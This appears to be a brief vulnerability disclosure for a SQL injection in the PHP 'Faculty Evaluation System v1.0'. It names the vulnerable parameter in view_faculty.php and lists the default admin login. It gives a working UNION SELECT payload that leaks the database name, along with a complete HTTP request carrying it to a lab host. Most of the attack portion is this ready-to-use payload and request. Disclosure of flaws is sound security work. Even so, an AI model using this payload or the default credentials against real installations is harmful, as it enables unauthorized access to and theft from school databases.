# Faculty Evaluation System v1.0 by oretnom23 has SQL injection

Admin account password： admin@admin.com/admin123
 
BUG_Author: acmglz

vendors: https://www.sourcecodester.com/php/14635/faculty-evaluation-system-using-phpmysqli-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /eval/admin/view_faculty.php?id=

Vulnerability location: /eval/admin/view_faculty.php?id=, id

dbname =evaluation_db

[+] Payload: /eval/admin/view_faculty.php?id=-1%20union%20select%201,2,3,4,database(),6,7,8,9--+ // Leak place ---> id

```sql
GET /eval/admin/view_faculty.php?id=-1%20union%20select%201,2,3,4,database(),6,7,8,9--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=lrrse02i69soj9l3lnarhnd9ck
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/233827284-a7d59075-0ec6-429b-b875-0067fe3bcf76.png)
